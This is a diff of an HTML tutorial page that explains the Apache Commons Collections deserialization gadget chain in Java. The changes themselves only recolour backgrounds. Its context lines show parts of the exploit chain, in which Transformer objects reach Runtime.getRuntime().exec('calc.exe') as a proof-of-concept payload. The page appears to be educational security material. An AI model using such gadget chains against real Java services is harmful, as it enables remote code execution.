@@ -8,7 +8,7 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
+      background-color: #1a1a2e;
       color: #dcdcdc;
       line-height: 1.6;
       padding: 0 2rem;
@@ -92,7 +92,7 @@
     }
     
     pre {
-      background-color: #1e2329;
+      background-color: #0d1117;
       border: 1px solid #333;
       border-radius: 4px;
       padding: 1rem;
@@ -163,7 +163,7 @@
     
     <p>
 <p>
-    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Person</span> pt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>();
+    <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Person</span> pt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Person</span>();
 <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"nice"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"YES"</span>});
 <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(transformer.<span style="color: #56a8f5;">transform</span>(pt)); <span style="color: #808080;">//Outputs Yes</span></pre></div>
 </p>
@@ -176,7 +176,7 @@
 </p>
 
     <p>
-        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> Person {
+        <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> Person {
 
     <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">String</span> <span style="color: #56a8f5;">nice</span>(<span style="color: #cf8e6d;">String</span> s) {
         <span style="color: #cf8e6d;">return</span> s;
@@ -204,7 +204,7 @@
 </p>
 
     <p>
-        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+        <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
 <span style="color: #cf8e6d;">import</span> java.util.HashMap;
 <span style="color: #cf8e6d;">import</span> java.util.List;
 <span style="color: #cf8e6d;">import</span> java.util.Map;
@@ -229,7 +229,7 @@
     </p>
 
     <p>
-        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+        <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
 <span style="color: #cf8e6d;">import</span> java.util.HashMap;
 <span style="color: #cf8e6d;">import</span> java.util.List;
 <span style="color: #cf8e6d;">import</span> java.util.Map;
@@ -270,7 +270,7 @@
     
     <p>So lets get into Payload</p>
 
-    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> CommonsCollections1PayloadOnly {
+    <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> CommonsCollections1PayloadOnly {
     <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>... args) {
         <span style="color: #cf8e6d;">String</span>[] command = {<span style="color: #6aab73;">"calc.exe"</span>};
         <span style="color: #cf8e6d;">final</span> <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
@@ -332,7 +332,7 @@
   Before that, let's simplify the code for clarity.
 </p>
 
-<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">ConstantTransformer</span> tr = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>);
 <span style="color: #cf8e6d;">InvokerTransformer</span> transformer = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]});
 <span style="color: #cf8e6d;">InvokerTransformer</span> tr3 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #b3ae60;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]});
 <span style="color: #cf8e6d;">InvokerTransformer</span> tr4 = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">String</span>[]{<span style="color: #6aab73;">"calc.exe"</span>});
@@ -352,7 +352,7 @@
     <h3>InvokerTransFormer</h3>
     <img src="images/cc/InvokerTransFormer_class.PNG">
     <p>The Below code shows the constuctor of the InvokerTransformer that will get called when class is being initialized.</p>
-    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #56a8f5;">InvokerTransformer</span>(<span style="color: #cf8e6d;">String</span> methodName, <span style="color: #cf8e6d;">Class</span>[] paramTypes, <span style="color: #cf8e6d;">Object</span>[] args) {
+    <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #56a8f5;">InvokerTransformer</span>(<span style="color: #cf8e6d;">String</span> methodName, <span style="color: #cf8e6d;">Class</span>[] paramTypes, <span style="color: #cf8e6d;">Object</span>[] args) {
     <span style="color: #cf8e6d;">this</span>.iMethodName = methodName;
     <span style="color: #cf8e6d;">this</span>.iParamTypes = paramTypes;
     <span style="color: #cf8e6d;">this</span>.iArgs = args;
@@ -386,7 +386,7 @@
   Try running the code below:
 </p>
 
-<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Runtime</span> rt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Runtime</span>();
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Runtime</span> rt = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Runtime</span>();
 rt.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5;">exec</span>(<span style="color: #6aab73;">"calc.exe"</span>);</pre></div>
 
 <p>
@@ -419,7 +419,7 @@ rt.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5
   Let's check what <strong>ConstantTransformer</strong>'s <code>transform()</code> returns next.
 </p>
 
-<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
 <span style="color: #cf8e6d;">import</span> java.util.HashMap;
 <span style="color: #cf8e6d;">import</span> java.util.List;
 <span style="color: #cf8e6d;">import</span> java.util.Map;
@@ -485,7 +485,7 @@ rt.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5
   After <code>invoke()</code> completes, we effectively have the result of <code>Runtime.getRuntime()</code>, and can proceed to <code>exec(...)</code>.
 </p>
 
-<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
 <span style="color: #cf8e6d;">import</span> java.util.HashMap;
 <span style="color: #cf8e6d;">import</span> java.util.List;
 <span style="color: #cf8e6d;">import</span> java.util.Map;
@@ -522,7 +522,7 @@ rt.<span style="color: #56a8f5;">getRuntime</span>().<span style="color: #56a8f5
   Running the code below will launch the calculator.
 </p>
 
-<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.ArrayList;
 <span style="color: #cf8e6d;">import</span> java.util.HashMap;
 <span style="color: #cf8e6d;">import</span> java.util.List;
 <span style="color: #cf8e6d;">import</span> java.util.Map;
